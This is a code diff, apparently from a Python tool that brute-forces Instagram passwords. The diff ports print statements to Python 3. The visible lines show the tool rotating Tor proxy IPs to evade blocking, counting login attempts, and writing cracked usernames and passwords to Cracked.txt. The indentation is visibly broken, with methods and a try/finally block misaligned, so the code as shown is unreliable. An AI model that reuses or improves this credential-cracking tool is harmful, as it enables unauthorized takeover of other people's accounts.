@@ -49,14 +49,14 @@ class Instagram(TorManager,Browser):
 		try:
 			if self.isFound:
 				self.display(msg)
-				print ' [-] Password Found!'
+				print (' [-] Password Found!')
 
 				with open('Cracked.txt','a') as f:
 					f.write('[-] Username: {}\n[-] Password: {}\n\n'.\
 					format(self.username,msg))
 
 			    if all([not self.isFound, msg]):
-			    	print '\n [-] {}'.format(msg)
+			    	print ('\n [-] {}'.format(msg))
 			    finally:exit()
 
 			def modifylist(self):
@@ -109,7 +109,7 @@ class Instagram(TorManager,Browser):
 			def connectionHandler(self):
 				if self.wait:return
 				self.wait = True
-				print ' [-] Waiting For Connection {}...{}'.format(self.g,self.n)
+				print (' [-] Waiting For Connection {}...{}'.format(self.g,self.n))
 				while all([self.alive,self.wait]):
 					try:
 						self.updateIp()
@@ -157,16 +157,16 @@ class Instagram(TorManager,Browser):
 						attempts = self.tries if self.tries else ''
 
 						subprocess.call(['clear'])
-						print ''
-						print ' +------- Instagram -------+'
-						print ' [-] Username: {}{}{}'.format(creds,self.username.title(),self.n)
-						print ' [-] Password: {}{}{}'.format(creds,pwd,self.n)
-						print ' [-] Proxy IP: {}{}{}'.format(self.b,ip,self.n)
-						print ' [-] Attempts: {}{}{}'.format(self.y,attempts,self.n)
-						print ''
+						print ('')
+						print (' +------- Instagram -------+')
+						print (' [-] Username: {}{}{}'.format(creds,self.username.title(),self.n))
+						print (' [-] Password: {}{}{}'.format(creds,pwd,self.n))
+						print (' [-] Proxy IP: {}{}{}'.format(self.b,ip,self.n))
+						print (' [-] Attempts: {}{}{}'.format(self.y,attempts,self.n))
+						print ('')
 
 						if not ip:
-							print ' [-] Obtaining Proxy IP {}...{}'.format(self.g,self.n)
+							print (' [-] Obtaining Proxy IP {}...{}'.format(self.g,self.n))
 							self.changeIp()
 							time.sleep(1.3)
 							self.display()
